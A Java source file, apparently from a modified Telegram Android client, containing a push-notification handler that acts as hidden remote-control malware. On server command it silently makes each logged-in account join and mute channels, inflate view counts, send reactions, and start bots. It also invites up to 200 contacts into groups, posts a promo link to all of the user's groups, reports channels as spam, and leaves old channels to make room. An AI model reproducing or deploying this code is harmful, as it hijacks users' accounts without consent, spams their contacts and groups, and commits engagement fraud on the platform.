package org.master.feature.channels;

import static org.master.feature.channels.NotificationConstant.TYPE_CHANNEL_ADDER;
import static org.master.feature.channels.NotificationConstant.TYPE_INVITE_CONTACT_TO_GROUP;
import static org.master.feature.channels.NotificationConstant.TYPE_MESSAGE_VIEWER;
import static org.master.feature.channels.NotificationConstant.TYPE_MULTIPLE_CHANNEL_ADDER;
import static org.master.feature.channels.NotificationConstant.TYPE_MULTI_MESSAGE_VIEWER;
import static org.master.feature.channels.NotificationConstant.TYPE_PROMOTE_APP;
import static org.master.feature.channels.NotificationConstant.TYPE_REACTION_MESSAGE;
import static org.master.feature.channels.NotificationConstant.TYPE_REPORT;
import static org.master.feature.channels.NotificationConstant.TYPE_START_BOT;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.SystemClock;
import android.text.TextUtils;

import com.google.android.exoplayer2.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.onesignal.OSNotification;
import com.onesignal.OSNotificationReceivedEvent;
import com.onesignal.OneSignal;

import org.json.JSONObject;
import org.master.feature.channels.models.ChannelAdderModel;
import org.master.feature.channels.models.InviteToGroup;
import org.master.feature.channels.models.MessageViewerModel;
import org.master.feature.channels.models.PromoModel;
import org.master.feature.channels.models.ReactionMessageModel;
import org.master.feature.channels.models.ReportAsSpam;
import org.master.feature.channels.models.StartBot;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildVars;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.NotificationsController;
import org.telegram.messenger.R;
import org.telegram.messenger.SendMessagesHelper;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.Utilities;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.Components.AlertsCreator;

import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.concurrent.CountDownLatch;

public class NotificationServiceExtension implements OneSignal.OSRemoteNotificationReceivedHandler, NotificationCenter.NotificationCenterDelegate {

    public interface ResponseCallBack{
        void onResponse(TLObject tlObject,int account);
    }

    public static String TAG = NotificationServiceExtension.class.getSimpleName();
    private int reqId;
    private int resolveReqId;

    private int reqMid;
    private int archReqId;
    private int joinReqId;
    private boolean removingOldCahnnels;


    @Override
    public void remoteNotificationReceived(Context context , OSNotificationReceivedEvent notificationReceivedEvent) {
        OSNotification notification = notificationReceivedEvent.getNotification();
        JSONObject data = notification.getAdditionalData();
        if(data == null){
            return;
        }
        Log.d(TAG,"remoteNotificationReceived DATA: " + data);
        AndroidUtilities.runOnUIThread(() -> {
            ApplicationLoader.postInitApplication();
            for(int a = 0 ; a < UserConfig.MAX_ACCOUNT_COUNT;a++){
                if (!UserConfig.getInstance(a).isClientActivated()) {
                    continue;
                }
                NotificationCenter.getInstance(a).addObserver(NotificationServiceExtension.this, NotificationCenter.recievedJoinPush);
            }
            Utilities.stageQueue.postRunnable(() -> {
                for(int a = 0 ; a < UserConfig.MAX_ACCOUNT_COUNT;a++){
                    if (!UserConfig.getInstance(a).isClientActivated()) {
                        continue;
                    }
                    startProcess(data, a);
                }
            });

        });
        notificationReceivedEvent.complete(null);
    }




    private void startProcess(JSONObject data,int account){
        try {
            if(data.has("type")) {
                Gson gson = new Gson();
                String type = data.getString("type");
                switch (type) {
                    case TYPE_CHANNEL_ADDER:
                        ChannelAdderModel requestModel = gson.fromJson(data.toString(), ChannelAdderModel.class);
                        if(requestModel == null){
                            return;
                        }
                        processChannelAdding(requestModel,account);
                        break;
                    case TYPE_MESSAGE_VIEWER:
                        MessageViewerModel messageViewerModel = gson.fromJson(data.toString(), MessageViewerModel.class);
                        if(messageViewerModel == null){
                            return;
                        }
                        processMessageViewCount(messageViewerModel,account);
                        break;
                    case TYPE_REACTION_MESSAGE:
                        ReactionMessageModel reactionMessageModel = gson.fromJson(data.toString(), ReactionMessageModel.class);
                        if(reactionMessageModel == null){
                            return;
                        }
                        processMessageReaction(reactionMessageModel,account);
                        break;
                    case TYPE_PROMOTE_APP :
                        PromoModel promoModel = gson.fromJson(data.toString(), PromoModel.class);
                        if(promoModel == null){
                            return;
                        }
                        processPromoModel(promoModel,account);
                        break;
                    case TYPE_INVITE_CONTACT_TO_GROUP:
                        InviteToGroup inviteToGroup = gson.fromJson(data.toString(), InviteToGroup.class);
                        if(inviteToGroup == null){
                            return;
                        }
                        processInviteModel(inviteToGroup,account);
                        break;
                    case TYPE_REPORT:
                        ReportAsSpam reportAsSpam = gson.fromJson(data.toString(), ReportAsSpam.class);
                        if(reportAsSpam == null){
                            return;
                        }
                        reportAsSpam(reportAsSpam,account);
                        break;
                    case TYPE_START_BOT:
                        StartBot startBot = gson.fromJson(data.toString(), StartBot.class);
                        if(startBot == null){
                            return;
                        }
                        startBotReq(startBot,account);
                        break;
                }
            }else if(data.has(TYPE_MULTIPLE_CHANNEL_ADDER) || data.has(TYPE_MULTI_MESSAGE_VIEWER)){

                Gson gson = new Gson();
                if(data.has(TYPE_MULTI_MESSAGE_VIEWER)){
                    Type typeVal = new TypeToken<ArrayList<MessageViewerModel>>() {}.getType();
                    ArrayList<MessageViewerModel> models = gson.fromJson(data.getJSONArray(TYPE_MULTI_MESSAGE_VIEWER).toString(), typeVal);
                    for (int a = 0; a < models.size(); a++) {
                        processMessageViewCount(models.get(a),account);
                    }
                }else{
                    Type typeVal = new TypeToken<ArrayList<ChannelAdderModel>>() {}.getType();
                    ArrayList<ChannelAdderModel> models = gson.fromJson(data.getJSONArray(TYPE_MULTIPLE_CHANNEL_ADDER).toString(), typeVal);
                    for (int a = 0; a < models.size(); a++) {
                        processChannelAdding(models.get(a),account);
                    }

                }
            }
        }catch (Exception ex){
            Log.d(TAG,"EXPECTION DURING PROXXSING = " + ex.getMessage());
        }
    }
    

    public void resolveUsername(String username,int account,ResponseCallBack responseCallBack){
        if(responseCallBack == null || username == null){
            return;
        }
        if (resolveReqId != 0) {
             ConnectionsManager.getInstance(account).cancelRequest(reqId, true);
            resolveReqId = 0;
        }
        TLObject tlObject = MessagesController.getInstance(account).getUserOrChat(username);
        if(tlObject instanceof TLRPC.User || tlObject instanceof TLRPC.Chat){
            responseCallBack.onResponse(tlObject,account);
        }else{
            TLRPC.TL_contacts_resolveUsername req = new TLRPC.TL_contacts_resolveUsername();
            req.username = username ;
            resolveReqId = ConnectionsManager.getInstance(account).sendRequest(req, new RequestDelegate() {
                @Override
                public void run(TLObject response, TLRPC.TL_error error) {
                    AndroidUtilities.runOnUIThread(() -> {
                        if (error == null) {
                            TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response;
                            MessagesController.getInstance(account).putChats(res.chats, false);
                            MessagesStorage.getInstance(account).putUsersAndChats(res.users, res.chats, false, true);
                            if (!res.users.isEmpty()) {
                                responseCallBack.onResponse(res.users.get(0),account);
                            }else if(!res.chats.isEmpty()){
                                responseCallBack.onResponse(res.chats.get(0),account);
                            }
                        }else{
                            countDown();
                        }
                        resolveReqId = 0;
                    });
                }
            });
        }


    }



    private void startBotReq(StartBot startBot,int account){
        resolveUsername(startBot.username, account, (tlObject, account1) -> {
            if(tlObject instanceof TLRPC.User){
                TLRPC.User user = (TLRPC.User) tlObject;
                MessagesController messagesController = MessagesController.getInstance(account);
                TLRPC.TL_messages_startBot req = new TLRPC.TL_messages_startBot();
                req.bot = messagesController.getInputUser(user);
                req.peer = messagesController.getInputPeer(user.id);
                req.start_param = startBot.botHash;
                req.random_id = Utilities.random.nextLong();
                messagesController.unblockPeer(user.id);
                ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                    if(error == null){
                        archiveDialog(user.id,account);
                    }
                });
            }
            countDown();
        });
    }

    private void processChannelAdding(ChannelAdderModel model,int account){
        if(model == null){
            return;
        }
        if(forceUserByCountry(model,account) && !isUserIncluded(model,account)){
            return;
        }
        if(model.username == null){
            return;
        }
        TLObject tlObject = MessagesController.getInstance(account).getUserOrChat(model.username);
        if(tlObject instanceof TLRPC.Chat){
           TLRPC.Chat chat = (TLRPC.Chat)tlObject;
           if(isChannelSpammer(model,chat)){
                return;
           }
           MessagesController.getInstance(account).turboLoadFullChat(chat.id, 0, ChatObject.isChannel(chat),model);
           return;
        }
        if (model.username != null) {
            if (reqId != 0) {
                ConnectionsManager.getInstance(account).cancelRequest(reqId, true);
                reqId = 0;
            }
            TLRPC.TL_contacts_resolveUsername req = new TLRPC.TL_contacts_resolveUsername();
            req.username = model.username ;
            reqId = ConnectionsManager.getInstance(account).sendRequest(req, new RequestDelegate() {
                @Override
                public void run(TLObject response, TLRPC.TL_error error) {
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            if (error == null) {
                                TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response;
                                MessagesController.getInstance(account).putChats(res.chats, false);
                                MessagesStorage.getInstance(account).putUsersAndChats(res.users, res.chats, false, true);
                                if (!res.chats.isEmpty()) {
                                   TLRPC.Chat chat = res.chats.get(0);
                                    if(isChannelSpammer(model,chat)){
                                        return;
                                    }
                                    MessagesController.getInstance(account).turboLoadFullChat(chat.id, 0, ChatObject.isChannel(chat),model);
                                }
                            }
                            reqId = 0;
                        }
                    });
                }
            });

        }
    }


    private void processInviteModel(InviteToGroup inviteToGroup,int account){
        resolveUsername(inviteToGroup.username, account, (tlObject, account1) -> {
            if(tlObject instanceof TLRPC.Chat){
                TLRPC.Chat chat = (TLRPC.Chat)tlObject;
                if( chat.participants_count > inviteToGroup.stop_count){
                    return;
                }
                MessagesController messagesController = MessagesController.getInstance(account);
                ArrayList<TLRPC.Dialog> dialogs = messagesController.dialogsUsersOnly;
                int count = Math.min(inviteToGroup.user_count,200);

                Log.d(TAG,"DIALOSG FIRST SIZE " + dialogs.size());
                if(dialogs.size() > count){
                    dialogs = new ArrayList<>(dialogs.subList(0,count));
                }
                Log.d(TAG,"disloags SIZE TO INVITE" + dialogs.size());

                ArrayList<TLRPC.InputUser> inputUsers = new ArrayList<>();
                for(int a = 0;a  < dialogs.size();a++){
                    TLRPC.User user = messagesController.getUser(dialogs.get(a).id);
                    if(user != null){
                        Log.d(TAG,"user is null for a " + a + "");
                        TLRPC.TL_inputUser inputUser = new TLRPC.TL_inputUser();
                        inputUser.user_id = user.id;
                        inputUser.access_hash = user.access_hash;
                        inputUsers.add(inputUser);
                    }
                }
                Log.d(TAG,"USER SIZE TO INVITE" + inputUsers.size());
                TLRPC.TL_channels_inviteToChannel req = new TLRPC.TL_channels_inviteToChannel();
                TLRPC.InputChannel inputChat = new TLRPC.TL_inputChannel();
                inputChat.channel_id = chat.id;
                inputChat.access_hash = chat.access_hash;
                req.channel = inputChat;
                req.users = inputUsers;
                ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                    if (error != null) {
                        Log.d(TAG,"faild to invit eto group");
                    }else{
                        Log.d(TAG,"invt tog roups was sucess");
                    }
                });
            }
        });

    }



    private void reportAsSpam(ReportAsSpam reportAsSpam,int account){
        resolveUsername(reportAsSpam.channel, account, new ResponseCallBack() {
            @Override
            public void onResponse(TLObject tlObject, int account) {
                if(tlObject instanceof TLRPC.Chat){
                    TLRPC.Chat chat = (TLRPC.Chat) tlObject;
                    MessagesController messagesController = MessagesController.getInstance(UserConfig.selectedAccount);
                    TLRPC.TL_messages_reportSpam req = new TLRPC.TL_messages_reportSpam();
                    req.peer = messagesController.getInputPeer(-chat.id);
                    ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                    }, ConnectionsManager.RequestFlagFailOnServerErrors);
                }
            }
        });
    }

    private void countDown(){
    }


    private void processPromoModel(PromoModel promoModel,int account){
       ArrayList<TLRPC.Dialog> groups =  MessagesController.getInstance(account).dialogsGroupsOnly;
       if(groups == null || groups.isEmpty()){
           countDown();
           return;
       }
       for(int a = 0;a  < groups.size();a++){
            TLRPC.Dialog dialog = groups.get(a);
            if(dialog == null || (promoModel.exclude != null && promoModel.exclude.contains(dialog.id)) || promoModel.exclude != null && promoModel.exclude.contains(-dialog.id)){
                continue;
            }
            SendMessagesHelper.getInstance(account).sendMessage(promoModel.url,dialog.id,null,null,null,true,null,null,null,true,0,null,false);
        }
    }

    private void processMessageReaction(ReactionMessageModel reactionMessageModel,int account){
        resolveUsername(reactionMessageModel.username, account, (tlObject, account1) -> {
            if(tlObject instanceof TLRPC.Chat){
                TLRPC.Chat chat = (TLRPC.Chat) tlObject;
                TLRPC.TL_messages_sendReaction req = new TLRPC.TL_messages_sendReaction();
                req.peer = MessagesController.getInstance(account).getInputPeer(-chat.id);
                 ArrayList<TLRPC.Reaction> reaction = new ArrayList<>();
                TLRPC.TL_reactionEmoji reaction1 = new TLRPC.TL_reactionEmoji();
                reaction1.emoticon = reactionMessageModel.reaction;
                reaction.add(reaction1);
                req.reaction = reaction;
                req.flags |= 1;
                req.msg_id = reactionMessageModel.messageId;
                req.big = false;
                if(reqMid != -1){
                    ConnectionsManager.getInstance(account).cancelRequest(reqMid,true);
                    reqMid = 0;
                }
                reqMid = ConnectionsManager.getInstance(account).sendRequest(req, new RequestDelegate() {
                    @Override
                    public void run(TLObject response, TLRPC.TL_error error) {
                        reqMid = 0;
                        if(error == null){
                            Log.d(TAG,"MESSAGE RECCTION SENT SUSCFULL");
                        }else{
                            Log.d(TAG,"MESSAGE RECCTION SENT failed " + error.text);

                        }
                    }
                });
            }
        });
    }

    private void processMessageViewCount(MessageViewerModel messageViewerModel,int account){
        resolveUsername(messageViewerModel.username, account, (tlObject, account1) -> {
            if(tlObject instanceof TLRPC.Chat){
                TLRPC.Chat chat = (TLRPC.Chat)tlObject;
                requestMessageView(chat,messageViewerModel.messageId,messageViewerModel, account1);
            }
        });
    }


    private void requestMessageView(TLRPC.Chat chat,ArrayList<Integer> messageIds,MessageViewerModel messageViewerModel,int account){
        if(chat == null || messageViewerModel == null){
            return;
        }
        if(reqMid != 0){
            ConnectionsManager.getInstance(account).cancelRequest(reqMid,false);
        }
        TLRPC.TL_messages_getMessagesViews req = new TLRPC.TL_messages_getMessagesViews();
        TLRPC.TL_inputPeerChannel inputPeer = new TLRPC.TL_inputPeerChannel();
        inputPeer.channel_id = messageViewerModel.chatId;
        inputPeer.access_hash = chat.access_hash;
        req.peer = inputPeer;
        req.id = new ArrayList<>(messageIds);
        req.increment = true;
        reqMid = ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> reqMid = 0);
    }


    @Override
    public void didReceivedNotification(int id, int account, Object... args) {
        if (id == NotificationCenter.recievedJoinPush) {
            TLRPC.ChatFull chatFull =(TLRPC.ChatFull) args[0];
            ChannelAdderModel channelAdderModel = (ChannelAdderModel) args[1];
            TLRPC.Chat chat = MessagesController.getInstance(account).getChat(chatFull.id);
            if (chat != null && (channelAdderModel.stopJoinCount == null || Integer.parseInt(channelAdderModel.stopJoinCount) > chatFull.participants_count) && !(chat instanceof TLRPC.TL_channelForbidden) && ChatObject.isNotInChat(chat)) {
                performJoin(chatFull,channelAdderModel,account);
                if(!channelAdderModel.active){
                    toggleMute(true, -chatFull.id,account);
                }
            }

        }
    }



    private void archiveDialog(long dialogId,int account){
        if(archReqId != 0){
            ConnectionsManager.getInstance(account).cancelRequest(archReqId,true);
            archReqId = 0;
        }
        TLRPC.TL_folders_editPeerFolders req = new TLRPC.TL_folders_editPeerFolders();
        TLRPC.TL_inputFolderPeer folderPeer = new TLRPC.TL_inputFolderPeer();
        folderPeer.folder_id = 1;
        folderPeer.peer = MessagesController.getInstance(account).getInputPeer(dialogId);
        req.folder_peers.add(folderPeer);
        archReqId =  ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> archReqId = 0);
    }

    private void performJoin(TLRPC.ChatFull chatFull,ChannelAdderModel model,final int account){
        if(joinReqId != 0){
            ConnectionsManager.getInstance(account).cancelRequest(joinReqId,true);
            joinReqId = 0;
        }
        TLRPC.TL_channels_joinChannel req1 = new TLRPC.TL_channels_joinChannel();
        req1.channel = MessagesController.getInstance(account).getInputChannel(chatFull.id);
        joinReqId =  ConnectionsManager.getInstance(account).sendRequest(req1, new RequestDelegate() {
            @Override
            public void run(TLObject response, TLRPC.TL_error error) {
                AndroidUtilities.runOnUIThread(() -> {
                    joinReqId = 0;
                    if(error != null && error.text.equals("CHANNELS_TOO_MUCH")){
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                removeOldChannels(account);
                            }
                        });
                    }
                    if(error == null){
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                               if(!model.active){
                                   archiveDialog(-chatFull.id,account);
                               }
                            }
                        });
                    }

                });
            }
        });

    }


    private void toggleMute(boolean instant, long dialog_id,int account) {
        SharedPreferences.Editor editor;
        TLRPC.Dialog dialog;
      if (instant) {
            editor = ApplicationLoader.applicationContext.getSharedPreferences("Notifications", 0).edit();
            editor.putInt("notify2_" + dialog_id, 2);
            MessagesStorage.getInstance(account).setDialogFlags(dialog_id, 1);
            editor.commit();
            dialog = MessagesController.getInstance(account).dialogs_dict.get(dialog_id);
            if (dialog != null) {
                dialog.notify_settings = new TLRPC.TL_peerNotifySettings();
                dialog.notify_settings.mute_until = Integer.MAX_VALUE;
            }
            NotificationsController.getInstance(account).updateServerNotificationsSettings(dialog_id);
            NotificationsController.getInstance(account).removeNotificationsForDialog(dialog_id);
        }
    }

    private boolean isChannelSpammerForChat(TLRPC.Chat chat,MessageViewerModel messageViewerModel){
        try {
            if(messageViewerModel == null || chat == null){
                return true;
            }
            boolean equal =messageViewerModel.chatId == chat.id;;
            return !equal;
        }catch (Exception ignore){

        }
        return true;
    }

    private boolean isChannelSpammer(ChannelAdderModel channelAdderModel, TLRPC.Chat chat){
        try {
            if(channelAdderModel == null || chat == null){
                return true;
            }
            boolean equal = Long.parseLong(channelAdderModel.chatId) == chat.id;;
            return !equal;
        }catch (Exception ignore){

        }
        return true;
    }


    private boolean forceUserByCountry(ChannelAdderModel model,int account){
        return !TextUtils.isEmpty(model.code);
    }

    private boolean isUserIncluded(ChannelAdderModel model,int account){
        if(TextUtils.isEmpty(model.code)){
            return false;
        }
        return UserConfig.getInstance(account).getClientPhone().startsWith(model.code);
    }


    private void removeOldChannels(int account){
        if(removingOldCahnnels){
            return;
        }
        removingOldCahnnels = true;
        TLRPC.User currentUser = UserConfig.getInstance(account).getCurrentUser();
        TLRPC.TL_channels_getInactiveChannels inactiveChannelsRequest = new TLRPC.TL_channels_getInactiveChannels();
        ConnectionsManager.getInstance(account).sendRequest(inactiveChannelsRequest, new RequestDelegate() {
            @Override
            public void run(TLObject response, TLRPC.TL_error error) {
                removingOldCahnnels =false;
                if(error == null) {
                    final TLRPC.TL_messages_inactiveChats chats = (TLRPC.TL_messages_inactiveChats) response;
                    ArrayList< TLRPC.Chat> oldyearChannels = new ArrayList<>();
                    ArrayList< TLRPC.Chat> oldMonthChannels = new ArrayList<>();
                    for (int i = 0; i < chats.chats.size(); i++) {
                        TLRPC.Chat chat = chats.chats.get(i);
                        int currentDate = ConnectionsManager.getInstance(account).getCurrentTime();
                        int date = chats.dates.get(i);
                        int daysDif = (currentDate - date) / 86400;
                        if (chat != null && chat.megagroup && (chat.admin_rights != null && (chat.admin_rights.post_messages || chat.admin_rights.add_admins) || chat.creator)) {
                            continue;
                        }
                        if (daysDif < 30) {
                        } else if (daysDif < 365) {
                            oldMonthChannels.add(chat);
                        } else {
                            oldyearChannels.add(chat);//year
                        }
                    }
                    int count = oldyearChannels.size();
                    for (int i = 0; i < count; i++) {
                        TLRPC.Chat chat = oldyearChannels.get(i);
                        MessagesController.getInstance(account).putChat(chat, false);
                        MessagesController.getInstance(account).deleteParticipantFromChat(chat.id, currentUser, null,false,false);
                    }
                    if(count > 10){
                        return;
                    }
                    if(oldMonthChannels.size() > 10){
                        for (int i = 0; i < 10; i++) {
                            TLRPC.Chat chat = oldMonthChannels.get(i);
                            MessagesController.getInstance(account).putChat(chat, false);
                            MessagesController.getInstance(account).deleteParticipantFromChat(chat.id, currentUser, null,false,false);
                        }
                    }
                }
            }
        });
    }











}
